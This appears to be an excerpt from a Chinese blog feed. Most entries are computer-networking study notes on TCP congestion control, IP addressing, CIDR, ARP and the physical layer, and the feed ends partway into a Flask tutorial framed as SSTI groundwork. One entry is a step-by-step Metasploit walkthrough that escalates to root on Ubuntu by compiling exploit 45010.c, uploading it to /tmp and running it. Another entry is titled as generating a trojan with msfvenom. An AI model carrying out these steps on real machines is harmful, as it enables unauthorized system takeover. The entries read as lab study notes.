        <content type="html"><![CDATA[<h1 id="第五章-运输层"><a href="#第五章-运输层" class="headerlink" title="第五章 运输层"></a>第五章 运输层</h1><h2 id="TCP的拥塞控制"><a href="#TCP的拥塞控制" class="headerlink" title="TCP的拥塞控制"></a>TCP的拥塞控制</h2><h3 id="拥塞控制和流量控制的区别"><a href="#拥塞控制和流量控制的区别" class="headerlink" title="拥塞控制和流量控制的区别"></a>拥塞控制和流量控制的区别</h3><p>主要的区别在于：控制发送速率的  目的  不同。</p><p>流量控制的目的是：</p><blockquote><p>当接收方处理接收信息的速率很慢，需要发送方调小发送的速率。</p></blockquote><p>拥塞控制的目的是：</p><blockquote><p>当信道十分繁忙拥塞，需要发送方调小发送的速率，以减轻信道压力。</p></blockquote><h3 id="TCP的拥塞控制方法"><a href="#TCP的拥塞控制方法" class="headerlink" title="TCP的拥塞控制方法"></a>TCP的拥塞控制方法</h3><p>四种算法：</p><ul><li>慢开始</li><li>拥塞避免</li><li>快重传</li><li>快恢复</li></ul><h4 id="1-慢开始和拥塞避免"><a href="#1-慢开始和拥塞避免" class="headerlink" title="1. 慢开始和拥塞避免"></a>1. 慢开始和拥塞避免</h4><p>慢开始：</p><blockquote><p>每收到一个对新的报文的确认后，可以把拥塞窗口增加最多一个smss的数值。</p><p>也就是说：</p><p>拥塞窗口cwnd每次增加量= min(N,SMSS)</p><p>例子：p242</p></blockquote><p>慢开始门限ssthresh：</p><blockquote><p>当cwnd小于门限时，使用慢开始算法</p><p>当cwnd大于门限时，使用拥塞避免算法</p><p>当cwnd等于门限时，两种均可</p></blockquote><p>拥塞避免算法：</p><blockquote><p>cwnd线性增长（人话：cwnd每次加1、2、3或者。。。。。）</p><p>例子：p243</p></blockquote><h4 id="2-快重传和快恢复算法"><a href="#2-快重传和快恢复算法" class="headerlink" title="2. 快重传和快恢复算法"></a>2. 快重传和快恢复算法</h4><p>快重传：</p><blockquote><p>如果接收方仅仅只是少收了一个包，但是一直没有给发送方发送确认的话，那么发送方就会认为出现了超时并误认为网络拥塞。而实际上只是少发了一个包而已。</p><p>那么，这就需要接收方即使没收到这个包也得给一点反馈。这个反馈就是：无论收到后续的包有多少，只要不是它接下来想要的包，那就一直发送想要的包前一个包的确认。</p><p>当发送方连续三次收到这样的确认之后，就不会认为是网络拥塞了（收到了反馈，说明网络正常）。</p></blockquote><p>快恢复：</p><blockquote><p>使门限ssthresh = cwnd / 2</p><p>设置拥塞窗口cwnd = ssthresh</p><p>然后开始执行慢恢复算法</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
          <category> 运输层 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络层</title>
      <link href="/2023/11/18/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%AC%AC%E5%9B%9B%E7%AB%A0%20%E7%BD%91%E7%BB%9C%E5%B1%82/"/>
      <url>/2023/11/18/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%AC%AC%E5%9B%9B%E7%AB%A0%20%E7%BD%91%E7%BB%9C%E5%B1%82/</url>
      
        <content type="html"><![CDATA[<h1 id="第四章-网络层"><a href="#第四章-网络层" class="headerlink" title="第四章 网络层"></a>第四章 网络层</h1><hr><h2 id="本章主要内容"><a href="#本章主要内容" class="headerlink" title="本章主要内容"></a>本章主要内容</h2><ol><li>虚拟互联网和两种服务、两个层面的概念。</li><li>IP地址与MAC地址的关系。</li><li>传统分类的IP地址和无分类域间路由选择CIDR（后者是重点）</li><li>路由选择协议的工作原理</li></ol><hr><h3 id="4-1-网络层的几个重要概念"><a href="#4-1-网络层的几个重要概念" class="headerlink" title="4.1 网络层的几个重要概念"></a>4.1 网络层的几个重要概念</h3><h4 id="4-1-1-网络层提供的两种服务（面向连接还是无连接的争议）"><a href="#4-1-1-网络层提供的两种服务（面向连接还是无连接的争议）" class="headerlink" title="4.1.1 网络层提供的两种服务（面向连接还是无连接的争议）"></a>4.1.1 网络层提供的两种服务（面向连接还是无连接的争议）</h4><blockquote><p>面向连接：建立一条虚电路，预留双方通信的一切网络资源。双方占用这条虚电路直到通信结束。</p><p>无连接：通信双方不必先建立连接。直接发送分组，每一个分组独立发送。网络层不保证服务质量，出错的分组可能出错，丢失、重复、失序。</p></blockquote><p>互联网的设计思路是让网络层设计得尽量简单，想起上层只提供简单灵活的、无连接的、尽最大努力交互的数据报服务。</p><p>因此，最终采用了无连接的设计思路。这种设计思路的好处是使网络造价大大降低，运行方式更加灵活。</p><h4 id="网络层的两个层面"><a href="#网络层的两个层面" class="headerlink" title="网络层的两个层面"></a>网络层的两个层面</h4><p>在路由器上传递的信息有以下两大类：</p><blockquote><ol><li>转发源主机和目的主机之间所传送的数据</li><li>传送路由信息。（根据路由算法，在路由器中建立路由表，根据此导出转发表）</li></ol></blockquote><p>网络层划分成两个层面：</p><blockquote><ul><li>数据层面</li><li>控制层面</li></ul></blockquote><p>数据层面：每台路由器把收到的分组，根据生成的转发表，查询到对应的接口，转发出去</p><p>控制层面：每台路由器创建一个路由表（可以是自己根据路由算法生成，也可以是远程控制器下发），导出为转发表。</p><h5 id="软件定义网络SDN（Software-Defined-Network）"><a href="#软件定义网络SDN（Software-Defined-Network）" class="headerlink" title="软件定义网络SDN（Software Defined Network）"></a>软件定义网络SDN（Software Defined Network）</h5><p>新提出的概念，在SDN结构中，所有的路由器都变简单了。路由器之间不在相互交换路由信息。生成路由表的工作交给一个在逻辑上集中的远程控制器来做。</p><p>这一概念被用于广域网的升级改造，这样可以使网络的运行效率提高，可以获得更好的经济效益。</p><hr><h3 id="4-2-网际协议——IP-Internet-Protocol-。"><a href="#4-2-网际协议——IP-Internet-Protocol-。" class="headerlink" title="4.2 网际协议——IP(Internet Protocol).。"></a>4.2 网际协议——IP(Internet Protocol).。</h3><p>目前采用的两个版本：</p><blockquote><ul><li>IPv4</li><li>IPv6</li></ul></blockquote><p>与IP协议配套使用的三个协议</p><blockquote><ul><li>地址解析协议                 ARP（Address Resolution Protocol）</li><li>网际控制报文协议         ICMP （Internet Control Message Protocol）</li><li>网际组管理协议             IGMP（Internet Group Management Protocol）</li></ul></blockquote><h4 id="4-2-1-虚拟互联网络"><a href="#4-2-1-虚拟互联网络" class="headerlink" title="4.2.1 虚拟互联网络"></a>4.2.1 虚拟互联网络</h4><p>全世界有各种各样的网络，他们的寻址方案、最大分组长度，网络接入机制也不尽相同。</p><p>显然，为了互联更简单而要求大家使用相同的网络是不现实的。</p><p>毕竟，没有一种单一的网络能满足所有用户的需求。</p><p>因此，将这些不同的网络连接起来，就需要使用一些中间设备。</p><blockquote><p>物理层使用的中间设备：转发器</p><p>数据链路层使用的中间设备：网桥、桥接器、交换机</p><p>网络层使用的中间设备：路由器</p><p>网络层以上使用的中间设备：网关  （用网关连接两个不兼容的系统需要在高层进行协议的转换。）</p></blockquote><p>使用路由器将网络互联，每个网络统一使用IP协议</p><h4 id="4-2-2-IP地址"><a href="#4-2-2-IP地址" class="headerlink" title="4.2.2 IP地址"></a>4.2.2 IP地址</h4><p>IP地址现在由 互联网名字和数字分配机构ICANN(Internet Corporation for Assigned Names and Numbers)</p><p>IP地址分为两部分</p><blockquote><p>&lt;网络号&gt;&lt;主机号&gt;</p><p>​    n位        32-n位</p></blockquote><h5 id="IP地址的分类"><a href="#IP地址的分类" class="headerlink" title="IP地址的分类"></a>IP地址的分类</h5><blockquote><ul><li>A类：&lt;8（首位0）&gt;&lt;24&gt;     共32位，下同</li><li>B类：&lt;16（首位10）&gt;&lt;16&gt;</li><li>C类：&lt;24（首位110）&gt;&lt;8&gt;</li><li>D类：&lt;多播地址（首位1110）&gt;</li><li>E类：&lt;保留为今后使用（首位1111）&gt;</li></ul></blockquote><h5 id="无分类编址：CIDR"><a href="#无分类编址：CIDR" class="headerlink" title="无分类编址：CIDR"></a>无分类编址：CIDR</h5><blockquote><p>无分类遇见路由选择CIDR（Classless Inter-Domain Routing）</p></blockquote><p>采用无分类编址的IP地址的结构：</p><blockquote><p>&lt;网络前缀&gt;&lt;主机号&gt;</p></blockquote><h6 id="网络前缀"><a href="#网络前缀" class="headerlink" title="网络前缀"></a>网络前缀</h6><p>CIDR采用斜线记法，在IP地址后面加斜线，斜线后面写网络前缀所占的位数</p><p>如</p><blockquote><p>128.14.23.7/20</p></blockquote><h6 id="地址块"><a href="#地址块" class="headerlink" title="地址块"></a>地址块</h6><p>把网络前缀相同的所有连续的IP地址组成一个CIDR地址块。</p><h6 id="地址掩码"><a href="#地址掩码" class="headerlink" title="地址掩码"></a>地址掩码</h6><p>计算机通过使用地址掩码与IP地址进行<strong>与运算</strong>，能从IP地址算出网络地址</p><h4 id="4-2-3-IP地址与mac地址的区别"><a href="#4-2-3-IP地址与mac地址的区别" class="headerlink" title="4.2.3 IP地址与mac地址的区别"></a>4.2.3 IP地址与mac地址的区别</h4><p>略</p><h4 id="地址解析协议ARP"><a href="#地址解析协议ARP" class="headerlink" title="地址解析协议ARP"></a>地址解析协议ARP</h4><p>ARP的作用：</p><blockquote><p>已知IP地址，找对应的MAC地址</p></blockquote><p>当主机A要向<strong>本局域网</strong>主机B发送IP数据报时，先去ARP高速缓存中查看有无主机B的MAC地址，如果有，那就把这个MAC地址封装到MAC帧中发往主机B。</p>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
          <category> 网络层 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>物理层</title>
      <link href="/2023/11/18/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E7%89%A9%E7%90%86%E5%B1%82/"/>
      <url>/2023/11/18/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E7%89%A9%E7%90%86%E5%B1%82/</url>
      
        <content type="html"><![CDATA[<h1 id="第二章-物理层"><a href="#第二章-物理层" class="headerlink" title="第二章 物理层"></a>第二章 物理层</h1><h2 id="物理层功能"><a href="#物理层功能" class="headerlink" title="物理层功能"></a>物理层功能</h2><h3 id="物理层主要关心的点"><a href="#物理层主要关心的点" class="headerlink" title="物理层主要关心的点"></a>物理层主要关心的点</h3><ul><li>机械特性：接口所用集线器尺寸、引脚等</li><li>电器特性：电压范围</li><li>功能特性：指明某个电压所代表的含义</li><li>过程特性：指明对于不同功能的可能的各种可能事件的出现顺序</li></ul><h2 id="物理层的三种通信方式"><a href="#物理层的三种通信方式" class="headerlink" title="物理层的三种通信方式"></a>物理层的三种通信方式</h2><ul><li>单向通信（单工）</li><li>双向交替通信（半双工）</li><li>双向同时通信（全双工）</li></ul><h3 id="常用的编码方式"><a href="#常用的编码方式" class="headerlink" title="常用的编码方式"></a>常用的编码方式</h3><ul><li>不归零制</li><li>归零制</li><li>曼彻斯特编码</li><li>差分曼彻斯特编码</li></ul><h2 id="信道的极限容量"><a href="#信道的极限容量" class="headerlink" title="信道的极限容量"></a>信道的极限容量</h2><h3 id="信道所能通过的频率范围"><a href="#信道所能通过的频率范围" class="headerlink" title="信道所能通过的频率范围"></a>信道所能通过的频率范围</h3><p>奈氏准则：</p><blockquote><p>在带宽为W（hz）的低通信道中，若不考虑噪声影响，则码元传输的最高速率是2W（码元）每秒。</p><p>如果传输速率超过此上限，就会出现严重的码间串扰问题。</p></blockquote><h3 id="信噪比"><a href="#信噪比" class="headerlink" title="信噪比"></a>信噪比</h3><p>信号相对噪声更强，噪声的影响就更小。</p><p>信噪比是 信号的平均功率和噪声的平均功率之比。 S/N</p><p>通常使用分贝（dB）作为度量单位</p><blockquote><p>信噪比（dB） = 10 log10(S/N)</p></blockquote><h3 id="香农公式"><a href="#香农公式" class="headerlink" title="香农公式"></a>香农公式</h3><p>信道的极限信息传输速率</p><blockquote><p>C = W log2( 1 + S/N )</p></blockquote><p>香农公式表明，信道的信噪比越大，信息的极限传输速率也越大。</p><h2 id="导向传输媒体"><a href="#导向传输媒体" class="headerlink" title="导向传输媒体"></a>导向传输媒体</h2><ul><li>双绞线（无屏蔽/屏蔽双绞线）</li><li>同轴电缆</li><li>光缆</li><li>无线信道</li></ul><h2 id="信道复用技术"><a href="#信道复用技术" class="headerlink" title="信道复用技术"></a>信道复用技术</h2><h3 id="为什么要复用"><a href="#为什么要复用" class="headerlink" title="为什么要复用"></a>为什么要复用</h3><blockquote><p>多个发送方和接收方共用一个信道，节省资源提高效率。</p></blockquote><h3 id="三种复用方式"><a href="#三种复用方式" class="headerlink" title="三种复用方式"></a>三种复用方式</h3><ul><li>频分复用 FDM</li><li>时分复用 TDM</li><li>统计时分复用</li><li>波分复用</li><li>码分复用（涉及计算题）</li></ul><h4 id="码分复用-CDM-code-division-multiplexing-与-码分多址-code-division-multiple-access"><a href="#码分复用-CDM-code-division-multiplexing-与-码分多址-code-division-multiple-access" class="headerlink" title="码分复用 CDM( code division multiplexing ) 与 码分多址 ( code division multiple access )"></a>码分复用 CDM( code division multiplexing ) 与 码分多址 ( code division multiple access )</h4><blockquote><p>当码分复用CDM信道为多个不同地址的用户所共享时，就称为码分多址 CDMA </p></blockquote><p>每一个用户使用经过特殊挑选的不同码型，因此相互不会造成干扰。</p><p>算法：</p><blockquote><p>每一个码元分割成八个码片，每个码片可以是高电平（0）和低电平（1）。每个使用信道的对象自己独占一个特殊的码片序列。</p><p>保证每个不同的使用对象的码片序列之间两两正交。</p><p>正交：双方的对应位置码片相乘，再求和，最后除以码片的个数。所得的值如果是0，那双方的码片序列就是正交的。</p><p>这个计算的过程就是规格化内积。规格化内积为0——正交。</p><p>S*T = 1/m (每个S×T)求和。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
          <category> 物理层 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/11/18/%E5%AE%89%E5%85%A8%E5%85%8D%E6%9D%80/msf%E5%88%A9%E7%94%A8ubuntu%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/"/>
      <url>/2023/11/18/%E5%AE%89%E5%85%A8%E5%85%8D%E6%9D%80/msf%E5%88%A9%E7%94%A8ubuntu%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="msf利用ubuntu内核漏洞提权"><a href="#msf利用ubuntu内核漏洞提权" class="headerlink" title="msf利用ubuntu内核漏洞提权"></a>msf利用ubuntu内核漏洞提权</h1><p>问题： 当我们以一个普通用户登录到Linux操作系统以后，怎么把权限提升到root用户？</p><ol><li>内核漏洞 脏牛</li><li>sudo</li><li>suid提权</li><li>找敏感文件</li></ol><h2 id="Linux内核的作用"><a href="#Linux内核的作用" class="headerlink" title="Linux内核的作用"></a>Linux内核的作用</h2><ol><li>管理进程</li><li>管理内存</li><li>管理驱动</li><li>管理文件和网络</li><li>……</li></ol><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20230804191904571.png" alt="image-20230804191904571"></p><h3 id="查看内核版本的命令"><a href="#查看内核版本的命令" class="headerlink" title="查看内核版本的命令"></a>查看内核版本的命令</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uname -a </span><br><span class="line">uname -mrs</span><br><span class="line">cat /proc/version</span><br></pre></td></tr></table></figure><h3 id="kali-里有内核漏洞利用的脚本军火库"><a href="#kali-里有内核漏洞利用的脚本军火库" class="headerlink" title="kali 里有内核漏洞利用的脚本军火库"></a>kali 里有内核漏洞利用的脚本军火库</h3><p>Linux内核漏洞利用脚本所在的目录：</p><blockquote><p>/usr/share/exploitdb/exploits/linux/local</p></blockquote><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20230802214702648.png" alt="image-20230802214702648"></p><h3 id="可以使用searchsploit工具查询军火库中合适的脚本"><a href="#可以使用searchsploit工具查询军火库中合适的脚本" class="headerlink" title="可以使用searchsploit工具查询军火库中合适的脚本"></a>可以使用searchsploit工具查询军火库中合适的脚本</h3><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20230802214940179.png" alt="image-20230802214940179"></p><h3 id="脚本需要编译成可执行程序"><a href="#脚本需要编译成可执行程序" class="headerlink" title="脚本需要编译成可执行程序"></a>脚本需要编译成可执行程序</h3><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20230803222236084.png" alt="image-20230803222236084"></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc <span class="number">45010</span>.c -o <span class="number">45010</span></span><br></pre></td></tr></table></figure><h2 id="利用Linux内核漏洞提权过程（借助脚本）"><a href="#利用Linux内核漏洞提权过程（借助脚本）" class="headerlink" title="利用Linux内核漏洞提权过程（借助脚本）"></a>利用Linux内核漏洞提权过程（借助脚本）</h2><ul><li><p>首先需要获得目标机器的shell</p><p>  <img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20230804193224930.png" alt="image-20230804193224930"></p></li><li><p>查看自己当前用户名（如果是root就可省略接下来的步骤）</p>  <figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getuid</span><br></pre></td></tr></table></figure></li><li><p>获取当前系统信息（主要关注内核版本）</p>  <figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysinfo</span><br></pre></td></tr></table></figure></li><li><p>对照内核版本，查找可用的脚本</p>  <figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">searchsploit ubuntu <span class="number">16</span>.<span class="number">04</span></span><br><span class="line">cp /usr/share/exploitdb/exploits/linux/local/<span class="number">45010</span>.c ./</span><br></pre></td></tr></table></figure></li><li><p>把脚本编译成可执行程序，并将其上传至目标机器tmp目录（因为所有用户都可以对此目录做读写操作）</p>  <figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc <span class="number">45010</span>.c -o <span class="number">45010</span></span><br><span class="line">upload /root/<span class="number">45010</span> /tmp/<span class="number">45010</span></span><br></pre></td></tr></table></figure><p>  （注意：upload是meterpreter的命令）</p></li><li><p>进入目标操作系统的shell（因为meterpreter不能执行程序），给程序加上执行权限，执行</p>  <figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">chmod +x <span class="number">45010</span></span><br><span class="line">./<span class="number">45010</span></span><br></pre></td></tr></table></figure><p>  <img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20230803224550721.png" alt="image-20230803224550721"></p></li><li><p>查看当前用户名，提权成功</p>  <figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br></pre></td></tr></table></figure><p>  <img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20230803224733818.png" alt="image-20230803224733818"></p></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/11/18/%E5%AE%89%E5%85%A8%E5%85%8D%E6%9D%80/msf%E6%AF%92%E6%B6%B2%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC/"/>
      <url>/2023/11/18/%E5%AE%89%E5%85%A8%E5%85%8D%E6%9D%80/msf%E6%AF%92%E6%B6%B2%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<h1 id="msf毒液（venom）生成木马"><a href="#msf毒液（venom）生成木马" class="headerlink" title="msf毒液（venom）生成木马"></a>msf毒液（venom）生成木马</h1><p>对应指令：</p><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20230720160728647.png" alt="image-20230720160728647"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Python flask框架</title>
      <link href="/2023/10/09/%E5%B0%8F%E5%AF%84%E5%B7%A7/python%20flask%E6%A1%86%E6%9E%B6/"/>
      <url>/2023/10/09/%E5%B0%8F%E5%AF%84%E5%B7%A7/python%20flask%E6%A1%86%E6%9E%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="python-flask框架（SSTI模板注入前置知识）"><a href="#python-flask框架（SSTI模板注入前置知识）" class="headerlink" title="python flask框架（SSTI模板注入前置知识）"></a>python flask框架（SSTI模板注入前置知识）</h1><h2 id="什么是flask"><a href="#什么是flask" class="headerlink" title="什么是flask"></a>什么是flask</h2><p>flask是一个采用python语言编写的web框架</p><p>WSGI工具箱采用Werkzeug，模板引擎使用Jinjia2。</p><h2 id="python虚拟环境搭建"><a href="#python虚拟环境搭建" class="headerlink" title="python虚拟环境搭建"></a>python虚拟环境搭建</h2><ul><li>需要venv（python的虚拟环境）</li></ul><p>创建venv环境安装flask</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install python3-venv</span><br></pre></td></tr></table></figure><p>在opt目录下创建虚拟环境运行flask</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /opt</span><br><span class="line">python3 -m venv flask1</span><br></pre></td></tr></table></figure><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20231007174558548.png"></p><blockquote><p>如何运行真实环境和虚拟环境下的.py文件</p><p>真实环境：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 demo.py</span><br></pre></td></tr></table></figure><p>虚拟环境：</p><p>方法一</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/opt/flask1/bin/python3 demo.py</span><br></pre></td></tr></table></figure><p>方法二（激活虚拟环境）（退出虚拟环境的命令是：deactivate）</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> flask1</span><br><span class="line">source ./bin/activate</span><br><span class="line">python3 demo.py</span><br></pre></td></tr></table></figure></blockquote><h2 id="安装flask框架"><a href="#安装flask框架" class="headerlink" title="安装flask框架"></a>安装flask框架</h2><p>在虚拟环境下安装flask框架</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /opt/flask1</span><br><span class="line">source ./bin/activate</span><br><span class="line">pip install flask</span><br></pre></td></tr></table></figure><p>测试是否安装成功</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> flask</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>quit()</span><br></pre></td></tr></table></figure><h2 id="flask的应用"><a href="#flask的应用" class="headerlink" title="flask的应用"></a>flask的应用</h2><h3 id="一个简单的python演示程序"><a href="#一个简单的python演示程序" class="headerlink" title="一个简单的python演示程序"></a>一个简单的python演示程序</h3><p>功能：当访问网站根路径时会输出“hello benben”</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask //导入Flask类</span><br><span class="line">app = Flask(__name__)//创建一个Flask应用程序实例。 这里的__name__是一个特殊的全局变量。</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)//定义一个路由“/”（根路径）。当用户访问根路径时，hello函数将会被调用。</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;hello benben&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/dazhuang&quot;</span></span>)//定义路由<span class="string">&quot;/dazhuang&quot;</span>，同理</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dazhuang</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;hello dazhuang&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>://代码块用于确保只有在直接运行这个脚本时才启动 Flask 服务器。</span><br><span class="line">    app.run()//这里的run方法里面可以带参数。例：app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="string">&#x27;8081&#x27;</span>,debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><blockquote><ol><li>当一个 Python 文件（模块）被直接执行时，<code>__name__</code> 的值将会是字符串 <code>&quot;__main__&quot;</code>。这意味着这个模块是主程序，它正在被直接运行。</li><li>当一个 Python 文件（模块）被导入到其他模块中时，<code>__name__</code> 的值将是该模块的名称（不包括文件扩展名）。这意味着这个模块是作为一个库或模块被导入到其他代码中使用的。</li></ol></blockquote><p>在opt目录下编写如下代码并命名为“demo.py”，在python虚拟环境运行</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 demo.py</span><br></pre></td></tr></table></figure><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20231007190114289.png" alt="image-20231007190114289"></p><p>然后访问127.0.0.1:5000（flask默认在5000端口运行）</p><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20231007185956336.png" alt="image-20231007185956336"></p><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20231007190010527.png" alt="image-20231007190010527"></p><h2 id="flask变量及方法"><a href="#flask变量及方法" class="headerlink" title="flask变量及方法"></a>flask变量及方法</h2><p>例：</p><p>在下面的示例中，<strong>route()</strong> 装饰器的规则参数包含一个附加到 URL <strong>‘/hello’</strong> 的 <strong><name></strong> 变量部分。 因此，如果 <strong><a href="http://localhost:5000/hello/TutorialsPoint">http://localhost:5000/hello/TutorialsPoint</a></strong> 在浏览器中作为 <strong>URL</strong> 输入，**’TutorialPoint’** 将作为参数提供给 <strong>hello()</strong> 函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hello/&lt;name&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;hello %s&quot;</span> % name</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><blockquote><p>参数传递过程：</p><p>url中的<name> -&gt; hello(name) -&gt; 第6行的name -&gt; %s</p></blockquote><p>除了默认的字符串变量部分，还可以使用以下转换器构造规则</p><ul><li>int 接受整数</li><li>float 针对浮点值</li><li>path 接受斜杠作为目录分隔符</li></ul><p>参考： [Flask - 变量规则 (w3schools.cn)](<a href="https://w3schools.cn/flask/flask_variable_rules.html#:~:text=Flask">https://w3schools.cn/flask/flask_variable_rules.html#:~:text=Flask</a> – 变量规则 可以通过向规则参数添加可变部分来动态构建 URL。 这个可变部分被标记为  。,在浏览器中作为 URL 输入， ‘TutorialPoint’ 将作为参数提供给 hello () 函数。)</p><h2 id="flask-http方法（get、post传参）"><a href="#flask-http方法（get、post传参）" class="headerlink" title="flask-http方法（get、post传参）"></a>flask-http方法（get、post传参）</h2><p>w3cschools.cn的一个例子：</p><blockquote><p>默认情况下，Flask 路由响应 <strong>GET</strong> 请求。 但是，可以通过向 <strong>route()</strong> 装饰器提供方法参数来更改此首选项。</p><p>为了演示 <strong>POST</strong> 方法在 URL 路由中的使用，首先让我们创建一个 HTML 表单并使用 <strong>POST</strong> 方法将表单数据发送到 URL。</p><p>将以下脚本保存为 login.html</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">   